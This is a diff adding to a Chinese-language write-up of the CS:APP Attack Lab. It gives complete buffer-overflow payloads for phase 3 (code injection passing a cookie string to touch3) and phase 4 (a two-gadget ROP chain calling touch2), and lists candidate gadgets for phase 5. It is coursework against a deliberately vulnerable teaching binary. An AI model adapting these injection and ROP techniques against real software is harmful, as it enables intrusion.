@@ -999,7 +999,22 @@ ec 17 40 00 00 00 00 00
 
 phase3要求执行`touch3`函数：
 
-`touch3`会调用`hexmatch`函数，判断：
+```c
+void touch3(char *sval)
+{
+	vlevel = 3; /* Part of validation protocol */
+	if (hexmatch(cookie, sval)) {
+		printf("Touch3!: You called touch3(\"%s\")\n", sval);
+		validate(3);
+	} else {
+		printf("Misfire: You called touch3(\"%s\")\n", sval);
+		fail(3);
+	}
+	exit(0);
+}
+```
+
+`touch3`会调用`hexmatch`函数。它要求`sval`必须是`val`的十六进制表示：
 
 ```c
 /* Compare string to hex represention of unsigned value */
@@ -1012,3 +1027,137 @@ int hexmatch(unsigned val, char *sval)
 	return strncmp(sval, s, 9) == 0;
 }
 ```
+
+与phase2不同的是，phase3要求传入一个字符串。根据分析，这个字符串必须是cookie的十六进制表示。
+
+Writeup中给的建议：
+- 输入中必须包含cookie的表示字符串。
+- C/C++中的字符串带尾零。
+- `%rdi`应当存储的是字符串的首地址。
+- 函数`hexmatch`和`strncmp`在被调用时，会向栈中写入内容。在`getbuf`返回和注入代码返回后，`%rsp`实际上在输入缓冲区后56个字节，因此如果注入代码不加干预，继续调用函数有可能覆盖缓冲区内容。
+
+考虑到缓冲区有被覆盖的风险，最稳妥的方法是将字符串存储到缓冲区的最后。另外，`%rdi`的值应当设置为cookie表示字符串的地址，这里我们选取第17-25字节存储：
+
+```assembly
+mov $0x5561dcb0, %edi
+ret
+```
+
+对应的phase3输入：
+- 前40字节：指令和留白。
+- 第41-48字节：第一次返回地址，即注入代码地址。
+- 第49-56字节：第二次返回地址，即`touch3`首地址。
+- 第57-72字节：将要传递给`touch3`的字符串。
+
+```
+bf b0 dc 61 55 c3 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
+```
+
+成功：
+
+![[Pasted image 20240731154044.png]]
+
+### phase4
+
+在phase4之前，Writeup讲解了一下*返回值导向编程*（return-oriented programming，ROP）的攻击方式。
+
+不是所有程序都像`ctarget`这么傻：
+- 运行时栈的位置是完全随机的，想定位自己注入的代码极其困难。
+- 即使代码能定位，有些程序会明确标记某些程序段为不可执行。这样试图执行数据段或堆栈段的代码只会得到一个段错误。
+
+注意到：
+- `retq`指令会无条件地跳转到`M[rsp]`所指的地址，并将`rsp`加8。
+- `retq`指令的编码只有一个字节：`0xc3`，对于一个程序来讲并不罕见。
+
+因此，ROP期望在栈中构造一个长地址序列，每个地址存储一个代码地址，该地址处往后数1至若干字节是一个`0xc3`，`0xc3`前的若干字节一般可以解读为至少一条指令。
+
+这样做的意义是，只要栈顶指针指向该序列并执行了`retq`指令，整个序列中所有地址指向的`retq`前的字节都能够作为指令被执行：
+
+![[Pasted image 20240731161519.png]]
+
+`retq`前的字节在Writeup中被称为gadget。部分gadget较难作为单个指令出现，但可以作为其他指令的片段出现。
+
+`rtarget`刻意构造了数十个函数，称为gadget farm。每个函数在`retq`之间都包含数个不同的字节，以便根据这些字节构造ROP序列。这样ROP序列本身便是一个程序，可以执行一些遵从攻击者意愿的代码。
+
+回到phase4。它要求在`rtarget`中复现phase2的攻击行为，但只允许构造包含如下指令的ROP序列：`movq`、`popq`、`ret`、`nop`。
+
+Writeup给出了3条建议：
+- 对于本phase，使用到的gadget在gadget farm的前半部分（这不废话吗）
+- 本phase只需要使用两个gadget
+- 如果使用`popq`指令，它会从栈中弹出数据，因此输入字符串必须包含数据和gadget地址的组合
+
+phase2中，我们直接给`%rdi`实施了立即数赋值，但这里并没有包含cookie立即数的gadget，`gencookie`函数也实测无效。
+
+观察到如下两个可疑的gadget：
+
+```
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+```
+
+```
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+```
+
+第一个gadget包含了`movq %rax, %rdi`和`nop`两条指令。第二个包含了`popq %rax`和`nop`两条指令。结合Writeup的建议，我们需要考虑将立即数插入到栈内，让gadget通过`popq`将立即数传送到`%rax`中，再用`movq`指令传送到`%rdi`，这样便能够正常调用`touch2`了。
+
+phase4的答案如下构造：
+- 前40个字节留空。
+- 第41-48字节：第一个gadget的首地址`0x4019cc`，包含了`popq`指令。
+- 第49-56字节：数据`0x59b997fa`，为cookie立即数。
+- 第57-64字节：第二个gadget的首地址`0x4019c5`，包含了`movq`指令。
+- 第65-72字节：`touch2`的首地址。
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+c5 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+成功：
+
+![[Pasted image 20240731210228.png]]
+
+### phase5
+
+phase5是对phase3、phase4的综合。
+
+Writeup只有这两条提示：
+- 可能涉及到`movl`指令和双字节空指令。
+- 标准答案使用了8个gadget。
+
+根据Writeup给出的指令手册，以下gadget可能有用：
+
+| 首址         | 指令                          |
+| ---------- | --------------------------- |
+| `0x4019a2` | `mov %rax, %rdi`            |
+| `0x4019ab` | `popq %rax`                 |
+| `0x4019c5` | `mov %rax, %rdi`            |
+| `0x4019cc` | `popq %rax`                 |
+| `0x4019dc` | `popq %rsp; mov %eax, %edx` |
+| `0x401a06` | `mov %rsp, %rax`            |
+| `0x401a13` | `mov %ecx, %esi`            |
+| `0x401a27` | `mov %ecx, %esi`            |
+| `0x401a34` | `mov %edx, %ecx`            |
+| `0x401a3c` | `mov %esp, %eax`            |
+| `0x401a42` | `mov %eax, %edx`            |
+| `0x401a69` | `mov %edx, %ecx`            |
+| `0x401a86` | `mov %esp, %eax`            |
+| `0x401aad` | `mov %rsp, %rax`            |
